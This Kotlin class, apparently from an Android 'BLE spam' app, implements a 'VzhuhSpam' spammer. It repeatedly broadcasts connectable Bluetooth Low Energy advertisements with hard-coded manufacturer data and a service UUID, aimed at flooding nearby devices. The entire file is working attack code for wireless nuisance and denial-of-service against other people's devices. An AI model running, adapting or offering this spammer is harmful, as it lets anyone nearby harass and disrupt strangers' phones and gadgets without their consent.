package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import android.os.ParcelUuid
import java.util.UUID
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class VzhuhSpam : Spammer {

    private var blinkRunnable: Runnable? = null
    private var isSpamming = false
    private var loop = 0
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    companion object {
        private const val COMPANY_ID = 0x0000

        private const val MANUFACTURER_DATA_HEX =
            "4C517648557676524C546734"

        private val SERVICE_UUID: UUID =
            UUID.fromString("00001840-0000-1000-8000-00805f9b34fb")

        private const val DEVICE_NAME = "21019744"

        private fun hexToBytes(hex: String): ByteArray {
            require(hex.length % 2 == 0) { "HEX length must be even" }
            return ByteArray(hex.length / 2) { i ->
                hex.substring(i * 2, i * 2 + 2).toInt(16).toByte()
            }
        }
    }

    override fun start() {
        executor.execute {
            val advertiser = BluetoothAdvertiser()

            isSpamming = true
            loop = 0

            val manufacturerBytes = Helper.convertHexToByteArray(
                "4C517648557676524C546734"
            )

            while (isSpamming && loop <= Helper.MAX_LOOP) {

                val advertiseData = AdvertiseData.Builder()
                    .addManufacturerData(0x0000, manufacturerBytes)
                    .build()

                val scanResponse = AdvertiseData.Builder()
                    .addServiceUuid(ParcelUuid(SERVICE_UUID))
                    .build()

                advertiser.advertise(
                    advertiseData = advertiseData,
                    scanResponse = scanResponse,
                    connectable = true
                )

                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    break
                }

                advertiser.stopAdvertising()
                loop++
            }

            isSpamming = false
        }
    }




    override fun stop() {
        isSpamming = false
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable
}
